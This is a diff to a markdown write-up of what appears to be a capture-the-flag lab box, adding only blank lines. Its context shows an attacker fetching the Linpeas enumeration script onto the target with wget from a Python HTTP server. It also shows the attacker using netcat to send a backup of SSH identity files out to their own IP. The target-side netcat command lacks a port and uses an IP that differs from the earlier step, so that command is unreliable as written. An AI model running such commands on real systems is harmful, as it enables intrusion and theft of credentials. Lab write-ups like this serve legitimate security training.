@@ -133,11 +133,13 @@ We should now have a stable shell!
 I think it's important to always have some sort of enumeration running while we're working. So, one of the first things I do on a box is to get some sort of automated enuermation running. For Linux, I like to use `Linpeas`. There's a couple of ways we can get this onto the box, but normally I'll just `wget` it from my kali box.
 
 1. *On Attacker Machine, in the Linpeas directory*
+
 ```bash
 python -m SimpleHTTPServer
 ```
 
 2. *On Target Machine*
+
 ```bash
 cd /tmp/
 wget 10.10.14.10:8000/linpeas.sh
@@ -163,11 +165,13 @@ ls -la /home/david/public_www/protected-file-area/
 **BINGO!** We find `backup-ssh-identity-files.tgz`. Let's exfiltrate it!
 
 1. *On Attacker Machine*
+
 ```bash
 nc -lvp 1234 > backup-ssh-identity-files.tgz
 ```
 
 2. *On Target Machine*
+
 ```bash
 nc 10.10.14.40 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
 ```
